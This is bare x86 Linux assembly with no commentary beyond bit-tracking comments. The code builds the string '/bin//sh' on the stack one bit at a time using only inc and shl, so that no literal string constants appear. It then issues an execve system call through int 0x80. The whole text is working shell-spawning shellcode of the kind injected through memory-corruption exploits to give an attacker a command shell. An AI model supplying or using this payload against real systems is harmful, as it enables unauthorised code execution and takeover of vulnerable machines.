

xor    eax, eax
xor    ecx, ecx
push   ecx

inc    eax      // 01
shl    eax,1    // 010
inc    eax      // 011
shl    eax,1    // 0110
shl    eax,1    // 0110 0
inc    eax      // 0110 1
shl    eax,1    // 0110 10
shl    eax,1    // 0110 100
shl    eax,1    // 0110 1000
shl    eax,1    // 0110 1000 0
shl    eax,1    // 0110 1000 00
inc    eax      // 0110 1000 01
shl    eax,1    // 0110 1000 010
inc    eax      // 0110 1000 011
shl    eax,1    // 0110 1000 0110
inc    eax      // 0110 1000 0111
shl    eax,1    // 0110 1000 0111 0
shl    eax,1    // 0110 1000 0111 00
shl    eax,1    // 0110 1000 0111 000
inc    eax      // 0110 1000 0111 001
shl    eax,1    // 0110 1000 0111 0010
inc    eax      // 0110 1000 0111 0011
shl    eax,1    // 0110 1000 0111 0011 0
shl    eax,1    // 0110 1000 0111 0011 00
shl    eax,1    // 0110 1000 0111 0011 000
inc    eax      // 0110 1000 0111 0011 001
shl    eax,1    // 0110 1000 0111 0011 0010
shl    eax,1    // 0110 1000 0111 0011 0010 0
inc    eax      // 0110 1000 0111 0011 0010 1
shl    eax,1    // 0110 1000 0111 0011 0010 10
inc    eax      // 0110 1000 0111 0011 0010 11
shl    eax,1    // 0110 1000 0111 0011 0010 110
inc    eax      // 0110 1000 0111 0011 0010 111
shl    eax,1    // 0110 1000 0111 0011 0010 1110
inc    eax      // 0110 1000 0111 0011 0010 1111
shl    eax,1
shl    eax,1
shl    eax,1
inc    eax  
shl    eax,1    // 0110 1000 0111 0011 0010 1111 0010
shl    eax,1
inc    eax  
shl    eax,1
inc    eax  
shl    eax,1
inc    eax  
shl    eax,1
inc    eax      // 0110 1000 0111 0011 0010 1111 0010 1111
push   eax
xor    eax, eax
inc    eax
shl    eax,1
inc    eax
shl    eax,1    // 0110
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1    // 0110 1110
shl    eax,1
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1    // 0110 1110 0110
shl    eax,1
inc    eax
shl    eax,1
shl    eax,1
shl    eax,1
inc    eax      // 0110 1110 0110 1001
shl    eax,1
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1    // 0110 1110 0110 1001 0110
shl    eax,1
shl    eax,1
shl    eax,1
inc    eax
shl    eax,1    // 0110 1110 0110 1001 0110 0010
shl    eax,1
shl    eax,1
shl    eax,1
inc    eax
shl    eax,1    // 0110 1110 0110 1001 0110 0010 0010
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1
inc    eax
shl    eax,1
inc    eax      // 0110 1110 0110 1001 0110 0010 0010 1111
push   eax
xor    eax, eax

mov    ebx, esp
mov    al, 0xb
xor    edx, edx
int    0x80
